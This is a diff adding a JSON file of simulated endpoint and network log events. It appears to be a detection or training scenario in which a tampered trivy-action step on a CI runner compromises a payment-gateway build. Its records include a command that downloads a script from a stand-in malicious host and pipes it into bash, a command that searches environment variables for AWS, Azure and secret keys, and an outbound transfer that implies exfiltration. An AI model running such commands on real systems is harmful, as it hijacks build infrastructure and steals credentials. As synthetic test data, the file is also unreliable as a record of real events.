@@ -1,0 +1,297 @@
+[
+ {
+  "timestamp": "2026-03-27T08:12:00Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "",
+  "affected_host": "build-worker-04",
+  "action": "actions/checkout@v3",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG001",
+   "timestamp": "2026-03-27T08:12:00Z",
+   "source": "GitHub_Actions_Runner",
+   "repository": "bank-internal/payment-gateway",
+   "action_run": "actions/checkout@v3",
+   "status": "completed",
+   "runner_host": "build-worker-04"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:02Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "",
+  "affected_host": "build-worker-04",
+  "action": "aquasecurity/trivy-action@master",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG002",
+   "timestamp": "2026-03-27T08:15:02Z",
+   "source": "GitHub_Actions_Runner",
+   "repository": "bank-internal/payment-gateway",
+   "action_run": "aquasecurity/trivy-action@master",
+   "status": "Starting pre-execution hooks",
+   "runner_host": "build-worker-04"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:05Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "svc_cicd_runner",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "https://malicious-infra.net/payload.sh",
+  "command": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG003",
+   "timestamp": "2026-03-27T08:15:05Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "/usr/bin/bash",
+   "CommandLine": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+   "ParentImage": "/opt/actions-runner/Runner.Worker",
+   "User": "svc_cicd_runner"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.9
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:06Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "svc_cicd_runner",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "bash -c 'echo Running scan setup'",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG004",
+   "timestamp": "2026-03-27T08:15:06Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "/usr/bin/bash",
+   "CommandLine": "bash -c 'echo Running scan setup'",
+   "User": "svc_cicd_runner"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:08Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "svc_cicd_runner",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "env | grep -i 'AWS_|AZURE_|SECRET_'",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG005",
+   "timestamp": "2026-03-27T08:15:08Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "/usr/bin/env",
+   "CommandLine": "env | grep -i 'AWS_|AZURE_|SECRET_'",
+   "ParentImage": "/usr/bin/bash",
+   "User": "svc_cicd_runner"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.5
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:10Z",
+  "log_type": "network",
+  "source_ip": "10.0.40.100",
+  "destination_ip": "198.51.100.99",
+  "affected_user": "",
+  "affected_host": "",
+  "action": "network_connection",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 4500,
+  "raw_event": {
+   "log_id": "LOG006",
+   "timestamp": "2026-03-27T08:15:10Z",
+   "source": "zeek",
+   "src_ip": "10.0.40.100",
+   "dest_ip": "198.51.100.99",
+   "dest_port": 443,
+   "service": "ssl",
+   "orig_bytes": 4500,
+   "resp_bytes": 120
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.5
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:12Z",
+  "log_type": "network",
+  "source_ip": "10.0.40.100",
+  "destination_ip": "52.95.110.1",
+  "affected_user": "",
+  "affected_host": "",
+  "action": "network_connection",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 8000,
+  "raw_event": {
+   "log_id": "LOG007",
+   "timestamp": "2026-03-27T08:15:12Z",
+   "source": "zeek",
+   "src_ip": "10.0.40.100",
+   "dest_ip": "52.95.110.1",
+   "dest_port": 443,
+   "service": "ssl",
+   "orig_bytes": 8000,
+   "resp_bytes": 7800
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 1
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:15:15Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "svc_cicd_runner",
+  "affected_host": "",
+  "action": "process_execution",
+  "event_code": 1,
+  "url": "",
+  "command": "trivy fs --security-checks config,vuln",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG008",
+   "timestamp": "2026-03-27T08:15:15Z",
+   "source": "sysmon",
+   "EventID": 1,
+   "Image": "/usr/local/bin/trivy",
+   "CommandLine": "trivy fs --security-checks config,vuln",
+   "ParentImage": "/usr/bin/bash",
+   "User": "svc_cicd_runner"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ },
+ {
+  "timestamp": "2026-03-27T08:16:00Z",
+  "log_type": "endpoint",
+  "source_ip": "",
+  "destination_ip": "",
+  "affected_user": "",
+  "affected_host": "build-worker-04",
+  "action": "aquasecurity/trivy-action@master",
+  "event_code": 0,
+  "url": "",
+  "command": "",
+  "bytes_out": 0,
+  "raw_event": {
+   "log_id": "LOG009",
+   "timestamp": "2026-03-27T08:16:00Z",
+   "source": "GitHub_Actions_Runner",
+   "repository": "bank-internal/payment-gateway",
+   "action_run": "aquasecurity/trivy-action@master",
+   "status": "completed successfully",
+   "runner_host": "build-worker-04"
+  },
+  "detection_features": {
+   "is_off_hours": false,
+   "event_count_5m": 4,
+   "deviation_score": 0.1
+  },
+  "family_detection_features": {
+   "spike_detected": false,
+   "protocol_anomaly_detected": false,
+   "unique_destinations_seen": 0
+  }
+ }
+]
